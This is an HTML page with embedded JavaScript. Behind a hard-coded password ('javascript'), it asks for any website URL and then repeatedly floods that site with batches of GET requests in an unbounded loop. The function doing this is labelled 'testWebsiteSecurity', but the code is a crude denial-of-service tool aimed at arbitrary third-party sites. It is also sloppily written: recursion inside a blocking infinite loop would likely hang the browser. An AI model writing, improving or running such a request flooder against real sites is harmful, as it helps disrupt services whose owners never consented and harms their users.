<!DOCTYPE html>
<html>
<head>
    <title>Funny</title>
</head>
<body>
    <p>Password:</p>
    <input type="text" id="password" name="username">
    <button id="submit" onClick="mango()">Login</button>

<script>
let password = "";
let targetUrl = 'https://yourwebsite.com';
let iteration = 0;

function mango() {
    password = document.getElementById('password').value;
    if (password === "javascript") {
        const websiteUrl = prompt("Enter the website URL:");
        if (websiteUrl) {
            targetUrl = normalizeUrl(websiteUrl);
            testWebsiteSecurity();
        }
    } else {
        alert("Incorrect password");
    }
}

function normalizeUrl(url) {
    // Remove 'https://' or 'http://' if present
    url = url.replace(/^https?:\/\//, '');

    // Remove 'www.' if present
    url = url.replace(/^www\./, '');

    // Add 'https://www.' if not already present
    if (!url.startsWith('https://') && !url.startsWith('http://')) {
        url = 'https://www.' + url;
    }

    return url;
}

function testWebsiteSecurity() {
    for (let i = 0; i < 10; i++) { // Send 10 requests simultaneously
        const xhr = new XMLHttpRequest();
        xhr.open('GET', targetUrl, true);
        xhr.send();
    }

    // Dynamically create and execute a new infinite loop
    const newLoop = new Function('iteration', `
        while (password === "javascript") {
            testWebsiteSecurity();
            iteration ++;
            document.title = (\`iteration: $\{iteration}\`);
        }
    `);
    newLoop(iteration);
}
</script> <!-- Empty script tag -->
</body>
</html>
